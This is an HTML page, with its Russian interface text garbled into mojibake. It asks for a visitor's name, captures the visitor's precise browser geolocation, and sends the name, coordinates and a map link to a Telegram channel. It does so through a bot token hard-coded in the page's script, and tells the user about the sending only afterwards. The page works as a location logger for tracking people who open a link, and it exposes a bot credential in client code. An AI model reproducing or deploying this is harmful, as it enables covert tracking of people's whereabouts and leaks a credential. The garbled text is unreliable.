<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è —Å –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–µ–π</title>
</head>
<body>
  <h2>üåç –ì–¥–µ —Ç—ã –Ω–∞—Ö–æ–¥–∏—à—å—Å—è?</h2>
  <p id="output">–ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É, —á—Ç–æ–±—ã –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ</p>
  
  <!-- –§–æ—Ä–º–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –∏–º–µ–Ω–∏ -->
  <label for="name">–í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ –∏–º—è:</label>
  <input type="text" id="name" placeholder="–í–∞—à–µ –∏–º—è">
  
  <button onclick="getLocation()">üìç –û–ø—Ä–µ–¥–µ–ª–∏—Ç—å –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã</button>

  <script>
    const botToken = "7903305941:AAF_7buaRxszZuLBo-WOEZ2spgM4bVhj1TY"; // –¢–æ–∫–µ–Ω –±–æ—Ç–∞
    const channelUsername = "@lokacionnykanal"; // Username –∫–∞–Ω–∞–ª–∞, –≤ –∫–æ—Ç–æ—Ä—ã–π –±—É–¥—É—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å—Å—è –¥–∞–Ω–Ω—ã–µ

    function getLocation() {
      const name = document.getElementById("name").value; // –ü–æ–ª—É—á–∞–µ–º –∏–º—è
      if (!name) {
        document.getElementById("output").textContent = "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ –∏–º—è!";
        return;
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => sendToTelegram(position, name), showError, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        document.getElementById("output").textContent = "–ë—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é.";
      }
    }

    function sendToTelegram(position, name) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const accuracy = position.coords.accuracy;
      const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
      const msg = `üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –æ—Ç ${name}:\n\n–®–∏—Ä–æ—Ç–∞: ${lat}\n–î–æ–ª–≥–æ—Ç–∞: ${lon}\n–¢–æ—á–Ω–æ—Å—Ç—å: ¬±${Math.round(accuracy)} –º\n\nüåê –ö–∞—Ä—Ç–∞: ${mapsUrl}`;

      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram –∫–∞–Ω–∞–ª
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: channelUsername, // –ò–º—è –∫–∞–Ω–∞–ª–∞
          text: msg
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          document.getElementById("output").textContent = "‚úÖ –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã + –∏–º—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ –∫–∞–Ω–∞–ª!";
        } else {
          document.getElementById("output").textContent = "‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö.";
        }
      })
      .catch(error => {
        document.getElementById("output").textContent = "‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.";
      });
    }

    function showError(error) {
      let msg = "–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏.";
      if (error.code === 1) msg = "–î–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∑–∞–ø—Ä–µ—â—ë–Ω.";
      if (error.code === 2) msg = "–ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ.";
      if (error.code === 3) msg = "–ü—Ä–µ–≤—ã—à–µ–Ω–æ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è.";

      document.getElementById("output").textContent = "‚ö†Ô∏è " + msg;
    }
  </script>
</body>
</html>
